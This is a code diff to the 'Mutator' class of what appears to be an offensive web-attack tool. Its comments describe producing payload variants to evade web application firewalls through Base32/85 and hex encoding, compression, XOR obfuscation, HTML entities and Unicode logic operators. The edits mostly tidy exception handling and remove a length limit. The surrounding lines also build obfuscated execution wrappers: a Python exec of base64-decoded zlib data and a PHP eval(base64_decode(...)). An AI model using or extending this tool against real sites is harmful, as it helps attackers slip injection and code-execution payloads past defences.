@@ -30,17 +30,17 @@ class Mutator:
         
         # 1. Advanced Base Encodings (WAFs often forget Base32/85)
         try: variants.add(base64.b32encode(b_payload).decode())
-        except: pass
+        except (TypeError, binascii.Error): pass
         try: variants.add(base64.b16encode(b_payload).decode())
-        except: pass
+        except (TypeError, binascii.Error): pass
         try: variants.add(base64.b85encode(b_payload).decode())
-        except: pass
-        
+        except (TypeError, binascii.Error): pass
+
         # 2. Compression Variants (Hex stream)
         try: variants.add(zlib.compress(b_payload).hex())
-        except: pass
+        except Exception: pass
         try: variants.add(bz2.compress(b_payload).hex())
-        except: pass
+        except Exception: pass
         
         # 3. HTML Entity Polishing
         # & -> &amp; (WAF sees distinct string, Backend decodes)
@@ -54,7 +54,7 @@ class Mutator:
         # [WS3] 5. NIGHTMARE v6.0 Integrations (User Code)
         # XOR 0xAA Obfuscation (effective against weak pattern matchers)
         try: variants.add(''.join([chr(ord(c) ^ 0xAA) for c in payload]))
-        except: pass
+        except (TypeError, ValueError): pass
         
         # Reverse Payload (for specific mirror-logic vulnerabilities)
         variants.add(payload[::-1])
@@ -126,9 +126,8 @@ class Mutator:
         # [WS3] 6. Hex Encoding (Effective for string literals)
         # 'admin' -> 0x61646d696e
         try:
-             if len(payload) < 20: 
-                 variants.add("0x" + payload.encode().hex())
-        except: pass
+            variants.add("0x" + payload.encode().hex())
+        except (UnicodeEncodeError, AttributeError): pass
         
         # 7. Unicode Logic Operators
         if " OR " in payload:
@@ -157,8 +156,18 @@ class Mutator:
         
         # [WS3] From User Code #3 & #4: Common Polymorphs
         variants.update(Mutator._common_polymorph(payload))
-            
-        return list(variants)
+
+        # Deduplicate: remove empty, whitespace-only, and non-encodable variants
+        result = []
+        for v in variants:
+            if not v or not v.strip():
+                continue
+            try:
+                v.encode("utf-8")
+                result.append(v)
+            except (UnicodeEncodeError, UnicodeDecodeError):
+                pass
+        return result
 
     @staticmethod
     def mutate_padding(payload: str) -> str:
@@ -278,7 +287,7 @@ class Mutator:
             variants.add(f"python3 -c \"import zlib,base64;exec(zlib.decompress(base64.b64decode('{compressed}')))\"")
             # Python 2 wrapper
             variants.add(f"python -c \"import zlib,base64;exec(zlib.decompress(base64.b64decode('{compressed}')))\"")
-        except: pass
+        except Exception: pass
         
         # 3. PHP Base64 Wrapper
         variants.add(f"eval(base64_decode('{b64}'));")
